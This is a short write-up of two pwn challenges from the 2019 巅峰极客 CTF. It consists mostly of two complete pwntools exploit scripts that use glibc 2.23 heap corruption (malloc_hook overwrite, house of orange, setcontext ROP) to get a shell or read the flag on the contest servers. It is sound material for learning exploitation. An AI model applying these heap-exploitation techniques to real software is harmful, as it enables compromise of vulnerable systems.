# 2019_巅峰极客线上赛
比赛一共两道pwn题作出两题,一题3血一题4血,第一题比较简单,第二题限制比较多调了我好久...总体难度不大
# Snote
1. use `sysmalloc` to create unsorted bin
2. leak libc
3. get_shell
```python
from pwn import *
def cmd(c):
    p.sendlineafter("> ",str(c))
def add(size,c="A"):
    cmd(1)
    cmd(size)
    p.sendafter("> \n",c)
def free():
    cmd(3)
def edit(size,c="A"):
    cmd(4)
    cmd(size)
    p.sendafter("> \n",c)
def show():
    cmd(2)
context.log_level='debug'
libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.arch='amd64'
p=remote("55fca716.gamectf.com",37009)
name='n132'
 
p.sendlineafter("?\n",name)
add(0x68)
edit(0x70,"\x00"*0x68+p64(0xf90))
add(0xf00-0x30)
add(0x100)
add(0x88)
show()
base=u64(p.read(8))-(0x7ffff7dd1b41-0x7ffff7a0d000)
log.warning(hex(base))
add(0x68)
free()
libc.address=base
one=base+0xf02a4
edit(0x70,p64(libc.sym['__malloc_hook']-35))
add(0x68)
add(0x68,'\x00'*19+p64(one))
cmd(1)
 
#gdb.attach(p,'b *0x0000555555554F41')
p.interactive('n132>')
#flag{f5451eb86527ffe78366cd73038ea55b} 
```

# pwn
0. UAF -> overlap 
1. use `house_of_orange` to call  setcontext
2. rop : orw

```python
from pwn import *
def cmd(c):
    p.sendlineafter(":",str(c))
def add(idx,size,c="A"):
    cmd(1)
    p.sendlineafter(":\n",str(idx))
    p.sendlineafter(":\n",str(size))
    p.sendlineafter(":\n",c)
def show(idx):
    cmd(3)
    p.sendlineafter(":\n",str(idx))
def free(idx):
    cmd(2)
    p.sendlineafter(":\n",str(idx))
def edit(idx):
    cmd(4)
    p.sendlineafter(":\n",str(idx))
context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p=remote("a139cb3d.gamectf.com",15189)
#p=process('./pwn')
add(0,0x88)
add(1,0x88)
add(2,0x88)
add(3,0x88,p64(0x21)*16)
free(0)
show(0)
p.readuntil(": ")
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7fe959a9bb78-0x7fe9596d7000)
log.warning(hex(base))
free(2)
add(4,0x228,p64(0x21)*40)
show(2)
p.readuntil(': ')
heap=u64(p.readline()[:-1].ljust(8,'\x00'))-0x230
log.warning(hex(heap))
 
 
 
fio=heap+0x350
libc.address=base
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0x98,'\x00')+p64(0x21)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)+p64(0)+p64(0)+p64(0x21)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(0x47b75+base)
 
 
add(5,0x88)
add(6,0x88)
 
 
free(1)
free(6)
add(7,0x120-8,"\x00"*0x88+p64(0xa1)+'\x00'*0x58+p64(0x21)*5)
free(7)
free(6)
add(8,0x120-8,"\x00"*0x88+p64(0xa1)+p64(0)+p64(base+0x7ffff7dd37f8-0x7ffff7a0d000-0x10))
add(9,0x98)
free(8)
add(10,0x120-8,"\x00"*0x88+p64(0x231))
free(6)
free(10)
add(11,0x120-8,'\x00'*0x88+p64(0x231)+p64(heap))
add(12,0x230-8)
 
 
fio=heap+0x80
rdi=0x0000000000021102+base
rsi=0x00000000000202e8+base
rdx=0x0000000000001b92+base
syscall=0x00000000000bc375+base
rax=0x0000000000033544+base
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake= fake.ljust(0x68,'\x00')+p64(heap+0x10)+p64(0)
fake= fake.ljust(0x88,'\x00')+p64(0xff)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)+p64(0x000000000008e73e+base)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(0x47b75+base)+p64(0xdeadbeef)
xor_rax=0x000000000008b8c5+base
pay= [rax,2,syscall,xor_rax,rdi,4,rsi,heap+0x200,syscall,rax,1,rdi,1,syscall] 
rop  =flat(pay)
fake = fake.ljust(0x108,'\x00')+rop
add(13,0x230-8,"./flag".ljust(8,'\x00')+'\x00'*0x60+p64(heap+0x80)+fake)
cmd(5)
 
p.interactive('n132>')
```